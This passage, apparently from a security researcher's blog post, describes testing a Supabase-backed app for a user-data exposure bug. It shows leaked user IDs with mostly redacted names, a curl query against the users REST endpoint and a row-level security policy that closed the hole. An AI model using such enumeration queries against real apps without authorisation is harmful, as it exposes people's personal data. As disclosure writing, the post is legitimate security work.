+</span></span><span style="display:flex;"><span> {<span style="color:#f92672">&#34;user_id&#34;</span>:<span style="color:#e6db74">&#34;de1e9c3d-382f-48a4-bf1d-4dcee1249040&#34;</span>,<span style="color:#f92672">&#34;first_name&#34;</span>:<span style="color:#e6db74">&#34;Tester&#34;</span>,<span style="color:#f92672">&#34;last_name&#34;</span>:<span style="color:#e6db74">&#34;Mctesty&#34;</span>}, 
+</span></span><span style="display:flex;"><span> {<span style="color:#f92672">&#34;user_id&#34;</span>:<span style="color:#e6db74">&#34;0d64e14b-ae9d-4038-9fa4-fd7669432fe3&#34;</span>,<span style="color:#f92672">&#34;first_name&#34;</span>:<span style="color:#e6db74">&#34;REDACTED&#34;</span>,<span style="color:#f92672">&#34;last_name&#34;</span>:<span style="color:#e6db74">&#34;REDACTED&#34;</span>}, 
+</span></span><span style="display:flex;"><span> {<span style="color:#f92672">&#34;user_id&#34;</span>:<span style="color:#e6db74">&#34;6f89e47a-a19a-467d-9c54-9ed71b9ad3ea&#34;</span>,<span style="color:#f92672">&#34;first_name&#34;</span>:<span style="color:#e6db74">&#34;REDACTED&#34;</span>,<span style="color:#f92672">&#34;last_name&#34;</span>:<span style="color:#e6db74">&#34;REDACTED&#34;</span>}, 
+</span></span><span style="display:flex;"><span> {<span style="color:#f92672">&#34;user_id&#34;</span>:<span style="color:#e6db74">&#34;ab5e3a12-b1a3-419d-b86e-ac20ff919b46&#34;</span>,<span style="color:#f92672">&#34;first_name&#34;</span>:<span style="color:#e6db74">&#34;REDACTED&#34;</span>,<span style="color:#f92672">&#34;last_name&#34;</span>:<span style="color:#e6db74">&#34;REDACTED&#34;</span>}, 
+</span></span><span style="display:flex;"><span> {<span style="color:#f92672">&#34;user_id&#34;</span>:<span style="color:#e6db74">&#34;5c704a95-50af-43a0-b4e0-ebda01dddb77&#34;</span>,<span style="color:#f92672">&#34;first_name&#34;</span>:<span style="color:#e6db74">&#34;gtesww&#34;</span>,<span style="color:#f92672">&#34;last_name&#34;</span>:<span style="color:#e6db74">&#34;teasf&#34;</span>}, 
+</span></span><span style="display:flex;"><span> {<span style="color:#f92672">&#34;user_id&#34;</span>:<span style="color:#e6db74">&#34;c00e2bda-9995-4e1d-accb-bb037b20802d&#34;</span>,<span style="color:#f92672">&#34;first_name&#34;</span>:<span style="color:#e6db74">&#34;REDACTED&#34;</span>,<span style="color:#f92672">&#34;last_name&#34;</span>:<span style="color:#e6db74">&#34;REDACTED&#34;</span>}, 
+</span></span><span style="display:flex;"><span> {<span style="color:#f92672">&#34;user_id&#34;</span>:<span style="color:#e6db74">&#34;524a734e-7497-4b0c-b93a-a4dd2a9a1ede&#34;</span>,<span style="color:#f92672">&#34;first_name&#34;</span>:<span style="color:#66d9ef">null</span>,<span style="color:#f92672">&#34;last_name&#34;</span>:<span style="color:#66d9ef">null</span>}]<span style="color:#960050;background-color:#1e0010">%</span>
+</span></span></code></pre></div><h1 id="the-real-fix">The Real Fix</h1>
+<p>Monday morning, I wanted to document the bypass properly before reporting
+it. I&rsquo;d been testing this app for days and was getting tired.</p>
+<p>I needed a fresh auth token. Instead of extracting it manually from the
+browser, I asked Warp (my AI terminal) to grab it for me. Modern pentesting
+laziness at its finest.</p>
+<p>Then I tested:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>curl <span style="color:#e6db74">&#34;https://REDACTED.supabase.co/rest/v1/users?select=first_name,last_name&amp;limit=28&#34;</span>
+</span></span></code></pre></div><p>Response:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-json" data-lang="json"><span style="display:flex;"><span>[{<span style="color:#f92672">&#34;first_name&#34;</span>:<span style="color:#e6db74">&#34;Eden&#34;</span>,<span style="color:#f92672">&#34;last_name&#34;</span>:<span style="color:#e6db74">&#34;Stroet&#34;</span>}]
+</span></span></code></pre></div><p>One record. Just me.</p>
+<p>I tried different angles. Increased the limit. Tested GraphQL. Same result
+every time - I could only see my own data.</p>
+<p>They&rsquo;d actually implemented proper RLS:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#66d9ef">CREATE</span> POLICY <span style="color:#e6db74">&#34;users_select&#34;</span> <span style="color:#66d9ef">ON</span> users
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">FOR</span> <span style="color:#66d9ef">SELECT</span> <span style="color:#66d9ef">USING</span> (user_id <span style="color:#f92672">=</span> auth.uid());
+</span></span></code></pre></div><p>Real row-level security. You can only query your own row. A few hours later, I noticed GraphQL was disabled too. They were actively patching while I was testing, which is annoying for me, good for security. I wish more companies would patch that fast. The bug was finally dead. For real this time.</p>
+<h1 id="impact-assessment">Impact Assessment</h1>
+<h1 id="remediation">Remediation</h1>
+<h1 id="final-words">Final Words</h1>
+<h2 id="references">References</h2>
+
+                </div>
+                
+                <p class="terminal-prompt">skelli@macbook ~/posts % cd ..</p>
+                <p class="terminal-prompt">skelli@macbook ~ % ls</p>
+                
+                <div class="mt-4">
+                    <a href="javascript:history.back()" class="btn btn-outline-light">← Back</a>
+                    <a href="/" class="btn btn-outline-light">Home</a>
+                </div>
+            </div>
+        </div>
+    </div>
+<footer class="footer py-3 mt-5">
+    <div class="container text-center">
+        <span class="text-muted">Still Hacking Anyway</span>
+    </div>
+    
+    
+    <script src="/js/script.js"></script>
+</footer> </body>
+</html> 
